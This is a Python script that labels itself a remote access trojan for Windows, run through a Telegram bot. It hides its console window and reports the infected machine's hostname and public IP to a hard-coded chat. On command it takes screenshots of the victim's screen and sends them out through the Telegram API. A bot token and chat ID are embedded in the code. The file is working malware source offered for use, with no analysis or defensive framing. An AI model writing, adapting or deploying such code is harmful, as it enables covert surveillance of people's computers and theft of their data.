# RAT_script.py - Upload this to GitHub as a private gist or repo
# Telegram Bot RAT for Windows with screenshot, message, IP, and connection alert

import os
import sys
import subprocess
import threading
import time
import requests
import json
import base64
from datetime import datetime
from PIL import ImageGrab
import io

BOT_TOKEN = "8755658192:AAEEkXaihdEPyTRbj33bVt_-9ckubS2uiDA"
CHAT_ID = "7894519456"
BASE_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"

def send_message(text):
    try:
        requests.post(f"{BASE_URL}/sendMessage", data={"chat_id": CHAT_ID, "text": text}, timeout=10)
    except:
        pass

def send_photo(photo_bytes):
    try:
        files = {"photo": photo_bytes}
        requests.post(f"{BASE_URL}/sendPhoto", data={"chat_id": CHAT_ID}, files=files, timeout=15)
    except:
        pass

def get_ip():
    try:
        ip = requests.get("https://api.ipify.org", timeout=5).text
        return ip
    except:
        return "Unable to fetch IP"

def cmd_screenshot():
    try:
        img = ImageGrab.grab()
        buf = io.BytesIO()
        img.save(buf, format="PNG")
        buf.seek(0)
        send_photo(buf)
    except:
        send_message("Screenshot failed")

def cmd_message(msg_text):
    send_message(f"Message from bot: {msg_text}")

def cmd_ip():
    ip = get_ip()
    send_message(f"IP Address: {ip}")

def handle_updates(offset):
    try:
        resp = requests.get(f"{BASE_URL}/getUpdates", params={"offset": offset, "timeout": 30}, timeout=35)
        data = resp.json()
        if data.get("ok"):
            for update in data.get("result", []):
                new_offset = update.get("update_id", 0) + 1
                msg = update.get("message", {})
                if "text" in msg:
                    text = msg["text"].strip().lower()
                    if text == "/screenshot":
                        threading.Thread(target=cmd_screenshot).start()
                    elif text.startswith("/message"):
                        parts = text.split(" ", 1)
                        if len(parts) > 1:
                            threading.Thread(target=cmd_message, args=(parts[1],)).start()
                        else:
                            send_message("Usage: /message <text>")
                    elif text == "/ip":
                        threading.Thread(target=cmd_ip).start()
                return new_offset
    except:
        pass
    return offset

def main():
    # Send connection alert
    ip = get_ip()
    hostname = os.environ.get("COMPUTERNAME", "Unknown")
    send_message(f"Connected | Host: {hostname} | IP: {ip}")
    
    offset = 0
    while True:
        new_offset = handle_updates(offset)
        if new_offset != offset:
            offset = new_offset
        time.sleep(2)

if __name__ == "__main__":
    # Hide console window if run as .pyw or compiled
    if sys.platform == "win32":
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    main()
